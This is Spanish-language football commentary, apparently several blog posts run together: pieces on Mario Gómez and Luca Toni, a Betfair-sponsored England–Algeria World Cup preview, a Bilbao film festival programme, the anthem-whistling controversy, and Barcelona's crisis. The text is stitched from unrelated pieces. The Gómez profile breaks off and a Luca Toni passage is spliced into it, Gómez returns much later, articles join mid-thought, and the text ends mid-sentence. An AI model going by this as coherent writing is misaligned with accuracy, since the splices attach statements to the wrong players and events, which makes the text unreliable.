Gulliver en Liliput o quizá Gargamel en el País Maldito. Su fútbol viene desde las catacumbas de la Historia por otro camino, el de la Mannschaft arrolladora que no ganaba sino aplastaba, un cóctel de físico y fe si no seductor, hipnótico, y que vencía, vencía, vencía siempre. A los que lo remataban todo en aquellas selecciones no se les llamaba delanteros, arietes, ni nueves. Se les decía Panzers. Y si a alguien remite Mario Gómez, a pesar de su nombre hispano y su moreno mediterráneo, era a aquellas bestias pardas que sembraban el terror entre los porteros del continente; jugadores nunca demasiado finos, que fuera del área se movían como elefantes, pero que dentro igual les daba cabecear una pelota que una piedra. Nombres que vienen de la noche de los tiempos y aún provocan escalofríos: Rahn, Hrubesch, Jancker, Bierhoff.Quizá nació en el momento equivocado. Puede ser. Pero también es posible, y lógico, que tengamos en la cabeza las malas rachas, sus eternas travesías del desierto. Porque si hay que hablar de un delantero ciclotímico, aquí también el señor Gómez se coloca entre los primeros de la fila. No es fácil olvidar la Euro 08, en la que llegó a Austria como la gran esperanza blanca y acabó suplente, como un apestado, portando una etiqueta en la espalda en la que podía leerse “tronco”. Aquello fue el prólogo de una temporada espantosa, lastrado por el récord de 30 kilos que le aflojó el Bayern al Stuttgart, oveja negra en una de las mejores temporadas que ha firmado en su historia el equipo bávaro. No le entraba ni una.Sin embargo, por motivos que seguramente no conoce ni él mismo, el ángel volvió a tocarle el hombro. Su sustituto Olic, que había acabado quitándole el puesto, se hizo trizas la rodilla, y Klose se pasó la temporada penando entre achaque y achaque.Sin embargo contra el Milan, desenpolvó la pluma y la volvió precisa como un bisturí. Su juego estuvo cargado de sentido y ortodoxia. Tocó bien cada pelota, se ofreció de cara, excursionó fuera del área para aguantar el balón apoyándose en un físico imponente que todavía aguanta y solo necesitó cuatro tiros para anotarse un doblete.Martinho, Donati o Albertazzi cocieron el menú; Toni acabó de servir la cena. Y aunque los números dicen una cosa (desde la 2008-09 en el Bayern no pasa de los diez goles en una temporada) la cabeza no obedece. Será que en Verona se ha contagiado de la alegría propia de un proyecto joven. “He ganado un montón de dinero en mi carrera, pero sigo jugando porque me encanta el fútbol”, comentó.En 2008, camino del mundial de Sudáfrica, Luca Toni resucitaba tras marcarle a Grecia otro cabezazo imponente para quebrar una sequía personal que se prolongaba durante nueve meses. Como entonces igualaba a Gianluca Vialli en la tabla de goleadores con la selección escribi aquí mismo un artículo titulado ‘Y Luca Toni volvió a sonreir’ El títular era malísimo pero sabñia que podría reciclarlo en el futuro. A lo largo del Campeonato del Mundo, y de la mano de Betfair.com, os  ofreceremos un análisis previo de los partidos más interesantes del  torneo, prestando una especial atención a todos aquellos que os manejáis  en el mundo de las apuestas on-line. Andan los ingleses con la cabeza como un gps. Imaginando el itinerario que les llevaría a la final mundialista en caso de cerrar el cerrojo de la fase de grupos desde lo alto de la tabla. Si Inglaterra consigue salir campeón del grupo C, y  si la suerte acompaña en los vecinos D y A, su camino hacia la  semifinal podría aparecérseles empedrado de bonitas baldosas amarillas. Ghana en octavos y Uruguay o Corea del Sur en los cuartos serían los escollos en la hoja de ruta inglesa. Claro que para llegar a  tal situación aun les queda mucho que rascar. Pese al traspiés inicial Inglaterra aun patalea, como España, en el saco de los favoritos, pero pueden vaciarla en el contenedor de la basura al mínimo despiste. Esta noche en Ciudad del Cabo, con las apuestas claramente a favor, se enfrentan a una Argelia que, aunque demostró tanto orden en su derrota contra Eslovenia como alarmante falta de mordiente, querrá pelear por su derecho a seguir en la fiesta.Por cierto, andan también revueltos cada vez que se imaginan tres palos y una red. El murmullo mediático tras la espectacular cantada de Robert Green contra los americanos, dejó el estruendo vuvuzelista en una bromita con el matasuegras. La sombra de Gordon Banks es alargada y Capello ha optado por quitarle a Green las llaves del cerrojo y cedérselas a David James. “Taza y media” y “Vuelve el hombre” son dos titulares que se me ocurren para el evento. Muchos tenemos la certeza de que Joe Hart es el mejor portero inglés del momento pero Capello confía en James por su personalidad y los buenos años que ha despachado en el Portsmouth. De tercera opción a titular en el partido clave. Algunos ya imaginan un panorama cruel, con Inglaterra eliminada y minutos para tres porteros diferentes. Todo un país estará pendiente de si funciona el parche.Más incertidumbres. Steven Gerrard y Frank Lampard son demoledores por separado pero juntos nunca han sido los Gemelos Derrick. Jamás han mezclado bien y siempre se han solapado dando lugar a una asociación inane. En el decepcionante debut contra Estados Unidos Capello se encargó de honrar la tradición encajando a ambos en el centro del campo y la cosa salió como salió. Ni chicha ni limoná. Para este segundo envite el transalpino confíarña en Gareth Barry, en forma al fin, para vitaminar un centro del campo ahogado en su propio corsé y facilitarle a Gerro, ávido de demostrar tras una temporada mediocre, la carrera hacia arriba. Falta les hace. Otro quebradero de cabeza para los ingleses es la lesión de Ledley King, que arrastra molestias en los aductores desde el primer partido.Al otro lado de la cal Argelia querrá volver al mundo de los vivos tras su derrota ante Eslovenia. Ahí los argelinos demostraron tanto orden como falta de ambición con el agravante anímico de entregar en el encuentro en los minutos finales gracias a una calamidad postrera del guardameta Faouzi Chaouchi. Si el combinado norteafricano quiere ser, y no sólo pasar por,  en el Mundial tiene que dar la campanada hoy ante los ingleses y morder todo lo que no mordieron ante los eslovenos. La empresa se presenta complicada principalmente por la baja de su mejor delantero, Ghezzal, expulsado en el partido anterior. Pero si algo demostraron los argelinos durante la fase de clasificación fue una fe inquebrantable ante las dificultades.Supongo que a más de uno os ha pasado. Alguien te introduce en una conversación con algunos desconocidos. Están hablando sobre fútbol, sobre la enésima tontería folklórica alrededor de Madrid/Barça o tal vez sobre aquel penalti que no fue y que han decidido enmarcar en la cumbre de una conspiración contra su equipo del alma. Uno de esos temas que a ti tanto te saturan y que te empeñas en tratar de alejar lo más posible de tu concepción ideal de tu deporte preferido. Te quieren hacer partícipe de la conversación porque saben que el fútbol es precisamente ‘tu tema’. Y es entonces cuando, los que no te conocen, te encasillan.Porque creen que eres un animal vociferante, un consumidor voraz de tertulia futbolera televisiva. Alguien como ellos, dispuesto a dejarte la vida por defender la honradez del delantero de tu equipo mientras intentas aflojarte el nudo de la bufanda del cuello para poder tomar aire. Alguien dispuesto a hacer un doctorado en Arquitectura con tal de demostrar que el gol del rival era en claro fuera de juego. Y, claro, te avergüenzas. Reniegas de que alguien pueda imaginarte así.Cuando un desconocido me identifica como un apasionado del fútbol me gustaría que lo relacionara con iniciativas como el Thinking Football Film Festival, cuya tercera edición organiza en Bilbao la Fundación Athletic Club a partir de hoy, lunes 9 de febrero y hasta el próximo sábado día 14. Que entendiera que el fútbol puede ser mucho más que la morralla inclasificable que los grandes medios de comunicación tratan de meterle con embudo entre pecho y espalda día sí y día también. Porque lo que el ya asentado festival bilbaíno pretende es enfocar el fútbol en su vertiente de integrador social, de elemento socio-cultural indispensable en el desarrollo de una comunidad o de herramienta de desarrollo. Trasladar el fútbol, en definitiva, fuera de los grandes estadios y depositarlo en la sociedad para observar y evaluar su trabajo como elemento vertebrador de la misma. El programa del Thinking Football Film Festival, en la Sala BBK (Gran Vía, 19 – Bilbao) es el siguiente:– Lunes 9 (19:30), ‘Los rebeldes del fútbol II’– Martes 10 (19:00), ‘Wie im falschen Film’– Martes 10 (20:00), ‘Democracia em Preto e Blanco’– Miércoles 11 (17:00), ’18team’– Miércoles 11 (19:00), ‘Mundial. Gra o wszystko’– Jueves 12 (18:00), ‘Coach Zoran and his African Tigers’– Jueves 12 (20:00), ‘We must go’– Viernes 13 (18:00), ‘A world not ours’– Viernes 13 (20:00), ‘Sons of Ben’– Domingo 15 (19:00), ‘Foot et immigration, 100 ans d’histoire commune’ ¿Cómo me voy a poner a escribir ahora? ¿Cómo voy a acertar a pulsar las teclas en el orden correcto si ni siquiera sé si tengo que irme a la cama o tengo que salir a celebrarlo donde pueda? En realidad no tengo ganas de hacerlo porque no tengo ganas de pensar y porque sé que devolver mi cerebro a su temperatura normal de funcionamiento me va a llevar un buen rato. Ahora mismo, cuando el corazón bombea más de lo deseable, preferiría estar luciendo colores por las calles de una ciudad que me es ajena, quién sabe si capturando alguna mirada de aprobación y complicidad. Pero me lo debo. Me lo debo a mí mismo. Quiero guardar las sensaciones del momento para poder revivirlas dentro de unos años. Porque es mucho el tiempo acumulado en la espera. Son muchos los años transcurridos, hasta treinta y uno, para poder recuperar unos sentimientos que se perdían en la noche de los tiempos y que, de alguna u otra manera, todos confiábamos en rescatar. Se acabó la añoranza. Refresquemos, por fin, ese recuerdo infantil de una tarde de la primavera del 84 engullido por la marea humana en el Puente de Deusto que tanto miedo teníamos a olvidar.No sé si esta Supercopa es un título ‘menor’. Ni siquiera sé si el hecho de haberse ganado el derecho a disputar este trofeo sin haber conquistado Liga o Copa resta méritos a lo conseguido. Pero por mucho que la muy chapucera entrega del trofeo haya convertido lo que debería de haber sido un acto para la eternidad en una ceremonia clandestina y apresurada, sumando argumentos a esa idea de campeonato secundario, ganar siempre es ganar. Y hacerlo ante este FC Barcelona que había tomado por costumbre eso de maniatarnos cruelmente y someternos en cuantas finales coperas habíamos tenido el honor de tratar de disputarles en estos últimos años, supone un incalculable valor añadido. No vamos a restarnos méritos después de tantos años de intentos en balde. Vamos a valorar lo logrado. A enorgullecernos no por lo conseguido, sino por cómo se ha conseguido. Fieles a una tradición, a veces debilitada, que para muchos es estúpidamente arcaica pero que para nosotros supone un vínculo insuperable con el club de nuestra ciudad y el motivo principal para ser del equipo que somos. Convencidos de que otra manera de hacer las cosas es posible. Empeñados de manera casi suicida en nadar contracorriente. Felices por no haber sucumbido a las tentaciones y haber creído siempre que esa especialísima comunión del Athletic Club con su gente y ese sentimiento de pertenencia tan difícil de explicar acabarían, de nuevo, dando sus frutos. Treinta y un años después. Abrazado a su incontenible fiereza atacante, el Real Madrid dejó anoche prácticamente visto para sentencia el pase a las semifinales de la Liga de Campeones. Un 3-0 se antoja complicado de remontar para un Borussia Dortmund que, por lo previsto antes del partido y por lo confirmado anoche, está muy muy lejos del nivel que ofreció el pasado curso. Tiene algo este Madrid que lo catapulta como indudable favorito al título. Es esa voracidad que le permite anotar un gol en el minuto tres del partido y seguir volcado sobre la meta rival como si estuviese obligado a remontar una diferencia de cuatro goles en apenas media hora de juego. Es esa falta de clemencia deportiva, ese ‘egoísmo’ de sus atacantes, ese querer siempre un poco más.Por contra, el equiblibrio ataque-defensa que presenta el cuadro de Ancelotti ofrece no pocas dudas a estas alturas de la temporada. Con la advertencia que supuso el partido de hace quince días ante el Barça y en el que las ocasiones de gol sobre la meta de Diego López se fueron sucediendo a lo largo de los noventa minutos, el madridismo anda con la mosca detrás de la oreja ante la aparente inestabilidad defensiva de los suyos. No es de recibo en un equipo que aspira a ganar la Liga de Campeones conceder tantas ocasiones como concedió anoche el Real Madrid en los veinte últimos minutos del choque.En lugar de templar el partido, de retirar la sartén de las brasas, el Madrid permitió que el duelo siguiese abierto. Convirtió el centro del campo en un correcalles aparentemente incontrolable y fue ahí cuando muchos se percataron, por primera vez desde su grave lesión, de la ausencia de Sami Khedira. No es, desde luego, que el mediocentro alemán sea un jugador angular. Se ha venido demostrando en no pocos partidos que su ausencia, y la entrada de un futbolista infinitamente más dotado con la pelota en los pies como Ángel Di María, ha podido ser incluso beneficiosa para la verticalidad y la fluidez del juego madridista. Khedira apenas debe ser echado en falta en dos o tres partidos a lo largo de la temporada, pero son precisamente en esos partidos en los que se deciden los títulos o en los que se allana el camino hacia ellos. Es lógico que nadie se acuerde del germano-tunecino contra el Rayo Vallecano o contra el Almería. Pero es muy sensato lamentarse de su obligada ausencia en choques como el de anoche, con Xabi Alonso permanentemente sobrepasado (circunstancia que se hizo especialmente patente en la recta final del partido) y con mucho, mucho juego rival a las espaldas de Modric e Isco.Con el 3-0 en el marcador y con más ganas de escuchar el pitido final y marcharse al vestuario que otra cosa, el Madrid echó ayer de menos un ancla en el centro del campo. Lo intentó Ancelotti, aunque quizá ya tarde, con la entrada de Illarramendi y de Casemiro, pero el brasileño interpretó mal su rol sobre el césped.Y la libertad de expresión, amparada en nuestra Constitución, debe ser tenida en consideración de la forma en la que el texto exige: con respeto.Athletic y Barcelona son dos clubes que se cimentan en la diferencia. El club de Bilbao con su decisión de contar solamente con jugadores vascos, por la reivindicación de su cultura y de su personalidad. Son historia y también decisión ideológica. En un fútbol globalizado yo entiendo alabable su opción, su identidad. Aunque conlleve un cuestionamiento de la realidad política del país en el que compite. Sólo vascos es exclusión -laxa-, pero también apuesta por sus raíces. Es beneficioso, es diferente y es auténtico. Cuando se habla de la “españolización” del Madrid criticamos lo caduco de su propuesta. Cuando hablábamos del Athletic lo hacemos con cierta envidia, con aroma a clásico.El Barcelona lleva mucho tiempo canalizando ideologías independentistas. En su “més que un club” hay un afán diferenciador, único. Desde Oleguer a Piqué, cuando se habla del Barça se habla, también, de un posicionamiento político. De una marca catalana más cercana a la identidad autonómica que a la naturalidad estatal. Dentro de nuestro Estado, los clubes pueden señalarse como les venga en gana. Faltaría más. Es paradójico, y meritorio, que un equipo con tan marcados rasgos políticos haya logrado la globalización y expansión del Barça. Su orientación ideológica no ha impedido que andaluces, marroquíes o chinos mantengan la pasión por sus colores. Como el Livorno, el St. Pauli, el Lazio o el Rayo Vallecano; los clubes pueden cargarse de las referencias que les convengan. Son libres y soberanos y su único límite es el Ordenamiento Jurídico. Ignorar estas peculiaridades es ser ciegos ante una realidad esplendorosa. Posicionamiento Político y Respeto IdeológicoDicho todo esto, entendiendo las protestas –porque los pitos de la final son posicionamientos políticos y disconformidad con el modelo de Estado español, no nos engañemos-, creo que el único reproche a las aficiones es la falta de educación. Es una cuestión de civismo, y convivencia, no pitar los símbolos ajenos. No por mí, insisto, ni por muchos españoles a los que nos da exactamente igual la carga simbólica de himnos y banderas; sino por las personas a las que esas representaciones les resultan cercanas, propias y respetables. Del mismo modo que un español pitando Els Segadors o quemando una Ikurriña me resultaría amargamente triste y reprochable. El único límite a Libertad de Expresión, además de la mentira, debe ser el respeto a la diferencia. El miramiento por otras realidad y posicionamientos. La ética en bruto. La convivencia. El ejemplo de NeymarPondré un ejemplo cercano para explicarme. Cuando a Neymar, con el partido ganado, se le ocurre hacer un regate de malabarista frente a Bustinza, el Athletic se le echa encima. Creemos que el contrario siempre merece un respeto. El contrario en el deporte y en las reivindicaciones sociopolíticas, desde luego Euskadi y Cataluña están disconformes con el modelo estatal, están en una posición de desequilibrio, tienen a alguien opuesto (en este caso un Gobierno centralista y un Estado inflexible en lo territorial). Contra ellos va la pitada. Son dos territorios que necesitan más independencia y así la llevan reclamando muchos años. Neymar, como decía, falta el respeto al Athletic. Se equivoca. Se luce, se gusta, le da igual el rival, saca la magia y nadie lo ve genial sino humillante.Es unánime que el regate del brasileño es una falta de respeto al rival, como es unánime que los símbolos del Estado deben respetarse en una convivencia más o menos formal y pacífica. Los símbolos no como opción política, no como instrumentos de opresión ideológica, sólo por pura cortesía. Y coherencia, claro. Al final lo que se está disputando es la Copa del Rey –Jefe de Estado en España-. Competición que se juega libremente, en la Liga Española, con futbolistas que son internacionales con España; que luego escuchan serenamente el himno en Mundiales y Eurocopas aún contraviniendo sus propias posturas políticas.Neymar puede hacer esa jugada, pero no era el momento de hacerlo. Por respeto al equipo contrario. La afición del Barça y del Athletic puede pitar el himno, pero quizá no era el momento de hacerlo. Por respeto a la propia competición, al Jefe de Estado y a los miles de aficionados de ambos equipos que no sienten como propias sus aspiraciones políticas aún compartiendo colores con los que pitaron. CoherenciaEs difícil nadar y guardar la ropa en este tema. Mi opinión es sencilla: yo no hubiera pitado, pero entiendo el pitido. Yo no hubiera pitado, por respeto y coherencia insisto; pero entiendo que para expresarse políticamente cualquier medio es bueno, y un partido de fútbol, con tanta repercusión, es un marco impagable para acciones como estas. Hoy todos los informativos han abierto con la pitada del himno. Para un independentista, esto es más que positivo. La protesta es mejor cuanta más repercusión tiene, como es obvio.Es horrible, en cualquier caso, que este incidente sea valorado políticamente con la severidad con la que se está haciendo.Es desnaturalizar la libertad de comunicar, la libertad de compartir las ideas, aunque sea en forma de ruido. Todos nos haríamos un favor si naturalizáramos estas reacciones y las enjuiciáramos como lo que son: faltas de respeto y no contubernios desestabilizadores. Hay oportunismo partidistas y deriva institucional en el fútbol español.El problema, como decía al principio, es que los menos dialogantes se han quedado el “honor“ en patrimonio. Y sus símbolos. Y el que más golpes se da en el pecho, menos ganas tiene de ponerse a debatir. Las aficiones del Athletic y el Barça han pitado un himno que no sienten como propio. Un símbolo, el himno, contra otro símbolo, silbarlo. La libertad de expresión no tiene como límite la identidad de los mojigatos sino el propio decoro y las nociones básicas de respeto y cohabitación.Nosotros, como aficionados al fútbol, no deberíamos despolitizar este deporte. Todo es política, como pudimos comprobar en la final. E insisto, no hay mejor forma de entender la política que escuchando a los que piensan diferente de lo que nosotros pensamos. Aunque, como en la final, sólo oigamos pitos. Fue una derrota hermosa. Una agónica y perversa alegría. El Córdoba está en octavos de la Copa del Rey. En los equipos acostumbrados a sufrir, las alegrías son celebradas con una contagiosa e ingenua felicidad. Existe un fútbol de tonos grises, desvencijado frente al brillante escaparate de Primera, un fútbol que se debate entre el descenso, la humildad y el desesperado deseo de alcanzar el éxito, siquiera poder rozarlo. En esa batalla que es la Segunda División, tan cercana y lejana para el aficionado, se resumen todas las miserias de un deporte que, paradójicamente, se vuelca con los ricos y desprecia a los pobres. Eliminar a un Primera tiene algo de simbólico. Es la pequeña rebeldía del modesto, el que roba esos minutos garantizados en televisión, en prensa, y se los apropia, los reivindica, deja a las claras que un deporte que se juega pateando cuero no está sometido a la razón.El equipo blanquiverde, tras temporadas de peregrinación tibia, recupera la estima que dejo esparcida en las ruinas del viejo Arcángel. La meritoria y a la postre crucial victoria en casa por dos a cero hacía creíble el milagro. Ayer, en un desértico Sardinero, el fútbol se retorció en los minutos finales. El partido se había puesto fácil para el Racing. Lucas Alcaraz intentaba, a la pata coja, dominar a los suyos. No fue un aluvión local, pero hicieron lo justo para atemorizar a un Córdoba temblón. El gol de Iván Bolado caricaturizó a una defensa atropellada. El segundo y el tercero fueron un calco, Alberto demasiado estático, amarrado al travesaño, y la defensa más esforzada en agarrar al rival que en despejar el balón. El pitido del árbitro estaba cerca, los cordobesistas no habían creado demasiado peligro en todo el partido, la ilusión por pasar de ronda se diluía bajo la plomiza lluvia cántabra. Ni Pepe Díaz, ni Díaz de Cerio, ni Oriol Riera, ni la intermitente magia de Javi Flores lograban descentrar a los defensores racinguistas. Todo cambió cuando Delgado Ferreiro, tras un corner desesperado, vio mano de Christian tras una volea del canterano Flores. Las airadas protestas no lograron revertir una sentencia con aroma a pase.Jorge Luque no especuló, no alargó el sufrimiento de la parroquia blanquiverde. Colocó el balón y lanzó a la derecha de Mario. El gol acabó con la lucha santanderina, congeló aún más a los congelados espectadores y enfervorizó a los miles de cordobesistas que en sus casas o en los bares vivían esos minutos como el principio de algo grande. Todo es relativo en fútbol, tiene algo de tragicómico celebrar un pase a octavos de Copa, parece poco premio para muchos equipos, incluso una lacra. Una competición pesada, empequeñecida por la Federación, diseñada para que las sorpresas desaparezcan poco a poco, para seguir beneficiando a los de siempre; pero el Córdoba, en un duro doble partido, ha conseguido agitar ese estado de cosas. El Racing queda en la cuneta y el Córdoba sueña con ver desfilar por el Arcángel a ese otro fútbol de las alturas, a ese regalo que sería ver al Madrid, Barça, Athletic, Atlético o Valencia bregar en el pálido césped del Nuevo Arcángel.La derrota que fue una victoria pasará a la lista de pequeños éxitos del club. Ayer hablábamos de un equipo deprimido, acostumbrado a vivir el fútbol de plata como un funámbulo en el alambre. Este éxito pertenece a todos esos aficionados que tarde tras tarde dejan su dinero y su alegría en las gradas de un estadio monstruoso e imperfecto. Esos que han sustentado al equipo cuando campaba, de nuevo, en 2ª B. Para los que padecen la estrechez futbolística de Lucas Alcaraz semana tras semana, los que viven pendientes de patrocinadores, fichajes, lesiones y descartes en las escépticas páginas de los diarios locales. Pero también me gustaría que esta clasificación, por humilde que sea, sirva para acercar a esa parte de la ciudad que mira a su equipo con una mezcla de lástima y condescendencia. Esos que prefieren el brillo galáctico de la primera a la azarosa y cruel realidad del fútbol austero. A los de siempre, a los que impenitentemente acompañáis a los vuestros por las gradas vacías de los campos de la Liga Adelante, os pido que seáis generosos con esa gente que ahora da la espalda a la institución pero que a buen seguro poblará ventajista el estadio en octavos ante un rival jugoso, porque de ahí podrán surgir más socios, más aficionados ilusionados con un club acostumbrado a los sinsabores. Que hazañas como las de ayer sirvan para unir a una afición atomizada y poco afectiva, que el gol de Jorge Luque se recuerde como aquel que cambió la tendencia desapasionada de un equipo que necesita una ciudad ferviente, atenta y comprometida con el blanco y el verde de su escudo. Agosto es el mes donde más fútbol se juega, porque hay partidos enteros en la cabeza de cada aficionado. Si algo nos une como seguidores de este macabro deporte, lejos de colores y fobias, lejos de gradas y programuchos de madrugada; es la pretemporada.Con el camino expedito, imagen de dandy y unos cuantos kilos de menos, Mario volvió a golear sin piedad y sin descanso. Le dio igual que el equipo fuera cuesta abajo, que Van Gaal acabase fulminado o que la temporada se cerrase en un fracaso; él remató a la jaula todo lo que antes se le iba al limbo, y se le acabaron cayendo los goles de los bolsillos. Para desgracia del Villarreal, es esta versión del delantero la que van a encontrarse esta noche los amarillos. La que viene de enchufarle cuatro al Friburgo. La del Panzer. Recordando viejas historias pero sin poder quitarnos de la cabeza el partido histórico donde los haya que hemos presenciado hoy, volvemos la vista atrás al mejor momento de la historia mundialista de la selección hasta esta noche: el mítico gol de Zarra a Inglaterra en 1950, que dio paso a España a la ronda final en la que entre dos derrotas brilló un empate a dos frente al posterior campeón del mundo, Uruguay. El asunto es que enardecido por la victoria, el presidente de la Federación, Dr. Armando Muñoz Calero, pronunció la mítica frase “Hemos vencido a la pérfida Albión”. Llegada la ocurrencia a instancias superiores, el presidente no tardó en recibir un sobre cerrado. Su destitución. La historieta para el día de la final, ese que todos esperamos con nervios, temor, impaciencia y esperanza, no puede ser otra que el momento más grandioso de la historia de los Mundiales, ese que todos hemos visto millones de veces pero que siempre disfrutamos, una y otra vez, desde que el Pelusa agarra el balón junto a la línea de mediocampo del Estadio Azteca hasta que marcha exultante junto al fondo sabiendo que ha clavado el gol de todos los tiempos. Seguramente todos sabemos donde estábamos cuando se marcó ese gol, como sabremos el resto de nuestra vida donde estábamos esta noche. La noche de España. Hace unos días, antes de que la final de la Champions monopolizara la actualidad, comenzamos a describir la estructura del campeonato brasileño. Hablamos del campeonato nacional -el Brasileirao que ha comenzado hace pocas semanas- y nos quedamos en el sistema de descensos de la serie D, que nos lleva directamente a los campeonatos estaduales.La enorme extensión de Brasil (el quinto país más grande del mundo en superficie) dificultó desde el principio la disputa de un campeonato nacional. De hecho, el origen de algunos campeonatos estaduales se remonta a principios del siglo XX, mientras que el torneo nacional no se fundó hasta 1971; antes, el único formato de enfrentamiento entre equipos de todo el país había sido el copero. Por tanto, no es de extrañar la importancia y la solera de los campeonatos locales, y que se les dedique la primera parte de la temporada. Hasta 27 torneos que agrupan a los miles de equipos de Brasil, 26 de ellos correspondientes a los estados en los que se divide Brasil, y uno en el Distrito Federal, el campeonato Brasiliense o Candango. Mientras que algunos de los torneos se mueven en terrenos próximos al infrafútbol, como el Alagoano, el Amapaense o el Sergipano, otros como el Paranaerense, el Gaúcho o el Mineiro ofrecen un buen nivel. Aparte quedan el Carioca y el Paulista, en los que han jugado algunos de los mejores jugadores de la historia, y que describimos con un poco más de detalle a continuación.Seguramente el más famoso de los campeonatos estaduales es el Carioca, propio del estado de Río, y que contiene el Fla-Flu, uno de los derbies más famosos del mundo. Aparte de Flamengo y Fluminense, este torneo suma a otros equipos de gran relevancia en el fútbol sudamericano, como Botafogo o Vasco de Gama. El sistema de competición en la serie A (hay tres divisiones), como de costumbre, no es nada intuitivo. Los 16 equipos que disputan la máxima división se distribuyen en dos grupos de ocho, y dentro de cada grupo juegan todos contra todos a un solo partido. Los dos primeros de cada grupo se cruzan en semifinales, y los vencedores se juegan la final, todo ello a partido único. El ganador se lleva la Copa Guanabara, que este año ganó el Flamengo, tanto de Ronaldinho al Boavista.Una pérdida de balón suya en posición de extremo izquierdo (?) propició una peligrosa contra alemana que, de haber acabado en gol, hubiese condicionado muy severamente el partido de vuelta en Dortmund. No es que los de Klopp acumulasen méritos extraordinarios para llevarse al menos un gol del Bernabéu, es que los blancos lanzaron al aire numerosas invitaciones para entrar en su área. Cuando Mkhitaryan, Aubameyang o Reus atrapaban alguna, se colaban sin un instante de duda en la fiesta. Ninguno de ellos tiene las dotes de seducción de Lewandowski, por fortuna para el madridismo. Él se habría llevado a la chica al asiento trasero del coche.Es llamativo que el Real Madrid no consiguiera anoche matar el partido cuando debió de hacerlo y anular cualquier intento de avanzadilla germana. Es un equipo en una actitud tendente a la épica permanente, visualmente muy agradecido y que no especula con el resultado aun cuando debería de hacerlo. Meterse en la jaula de las fieras y descuidar la espalda, confiar todo tu sistema de seguridad al ímpetu y a la exuberancia física (inconmensurables ayer en ese sentido Ramos y, sobre todo, Pepe), implica asumir unos riesgos innecesarios y evitables que cualquier serio aspirante a ser el mejor equipo del continente tendría que tener controlados. ¿Cómo olvidar a Diego Costa? Paliar las importantes pérdidas sufridas por la plantilla del vigente campeón de Liga era la obsesiva misión desplegada en los despachos del Vicente Calderón durante este verano. Las sucesivas salidas de David Villa, Thibaut Courtois, Filipe Luís o Diego Costa afectaban directamente a la columna vertebral del conjunto de Simeone, de tal manera que amenazaban con menoscabar gravemente el rendimiento del mejor equipo de la 2013/14. Reforzarse y cubrir las bajas sufridas no era exclusivamente una cuestión de rendimiento deportivo. El asunto tenía un importante componente anímico, de poder sentirse en condiciones de seguir compitiendo con los dos gigantes de nuestro fútbol y con cualquiera que osara cruzarse en el camino europeo de los colchoneros, de no perder la rueda de una grupeta a la que el Atleti quiere engancharse aunque se tenga que dejar la misma vida en el esfuerzo económico.Después del impacto protagonizado el pasado curso por el hispanobrasileño Diego Costa tras su irrupción como delantero de primerísimo nivel Mundial y de la salida de éste con destino a Stamford Bridge por treinta y ocho millones de euros iba a resultar complicado mantenerse en semejante nivel. Por eso, el refuerzo tenía que ser de postín, contrastado en un club de primera plana europea y con sobrada experiencia en grandes ligas y competición continental. Mario Mandžukić (Slavonski Brod, Croacia, 1986) es el eslabón que viene a reemplazar a Costa en la cadena atlética. Y da la sensación que su notable cartel viene más dado por el sitio del que procede y por lo que ha supuesto económicamente (veintidós millones de euros por su traspaso) que por lo que realmente es.Porque a sus veintiocho años, y pese a haber pasado las dos últimas temporadas en el Bayern Múnich, Mandza nunca ha conseguido llegar a postularse realmente como delantero de primerísimo orden. Dos temporadas en Wolfsburgo y otras dos en el Allianz no han conseguido hacer de él un punta digno del más alto nivel de exigencia y no parece que ahora, y eso es algo en lo que el Atlético ha cambiado con respecto a las incorporaciones pasadas de Falcao (que llegó con 25 años) o Costa (que lo hizo, superadas sus cesiones, con 23), con una edad en la que ya es complicado pensar en superar techos, el croata vaya a ofrecer una versión que no conocemos de él.Mandžukić es un luchador con un carácter extraño que le ha llevado a sonados enfrentamientos con varios de sus técnicos. Felix Magath se vio obligado a tomar medidas disciplinarias con su goleador dejándolo durante varias semanas en la grada, cuando aún era jugador del Wolfsburgo. Sobre su trato con Guardiola han corrido ya ríos de tinta y tampoco él se ha encargado de suavizar una relación que parecía irreconciliable. El nuevo ariete colchonero es un superviviente acostumbrado a pelear por su sitio y un digno representante de la escuela deportiva balcánica, esa que establece la competitividad extrema como herramienta indispensable para alcanzar el éxito. Y en ese aspecto sí puede casar muy bien con su nuevo entrenador. Fue un torpe gol en propia puerta de Jordi Alba el detonante de los acontecimientos. Como si el cúmulo de despropósitos en el que parece verse envuelto el FC Barcelona desde hace unos meses hubiera necesitado de un ingrediente extra para hacer saltar por los aires una estructura que llevaba demasiado tiempo tambaleándose. Esa chispita necesaria para prender la mecha. Con la derrota en Anoeta (estadio en el que en la actual temporada han perdido sus encuentros Real Madrid, Atlético y el propio Barça) caliente, los fusiles comenzaron a apuntar hacia el banquillo barcelonista. El pecado de Luis Enrique, quien entendió que lo mejor para su equipo era el descanso de sus principales futbolistas en tierras guipuzcoanas, pareció magnificarse con el resultado adverso. Porque nadie jamás habría vuelto a hacer mención sobre la muy polémica y discutida suplencia de Messi, Neymar, Piqué o Rakitic si el Barça hubiese salido del feudo txuri-urdin con tres puntos más en su casillero y sus castigadas estrellas descansadas. Así de estúpido es el fútbol a veces. Pero ocurrió que el plan del técnico asturiano no respondió a las expectativas que éste había depositado en él. Ocurrió que los días extra de vacaciones de Navidad para Messi, Neymar o, ya en convocatoria de gracia, Dani Alves se volvieron en su contra y que el equipo, incapaz de voltear el resultado aún con la entrada de Leo tras el descanso, sacó su peor versión sobre el césped de Anoeta. Esa versión que, apenas cinco meses después de su ilusionante contratación, coloca a Luis Enrique en el disparadero como máximo responsable de un equipo que no funciona y en el que está resultando complejo encontrar acomodo a las sonadas incorporaciones del pasado verano.Sin embargo, no fue el del asturiano el primer nombre en aparecer en rojo tras la derrota en San Sebastián. En medio de un clima de insoportable tensión y conocedor de que su cabeza tenía precio, Andoni Zubizarreta disparó directamente a la cúpula directiva del club al advertir que Josep Maria Bartomeu tenia responsabilidad directa ante la sanción impuesta por la FIFA por las irregularidades en la incorporación de futbolistas menores de edad en las categorías inferiores del club azulgrana. Al ilegítimo presidente barcelonista se le abría un nuevo frente en los pasillos de la entidad. Haciendo gala de una autoridad desconocida hasta el momento, Zubi fue destituido pocas horas después de su cargo de director deportivo. No tanto por la reciente acumulación de sonados errores en su trabajo (Vermaelen, Douglas…), sino por haber osado señalar, no exento de razones, a los que mandan. Liquidado Andoni, bombero y escudo de la directiva, de la manera más limpia y aséptica posible, un nuevo frente se abriría en los campos de la Ciutat Esportiva de Sant Joan Despí en las horas siguientes a la derrota del domingo.En la mañana del día cinco, víspera de Reyes, el Barça tenía previsto a modo de acto excepcional un entrenamiento de puertas abiertas al público en el Miniestadi azulgrana.Cuando el balón aún 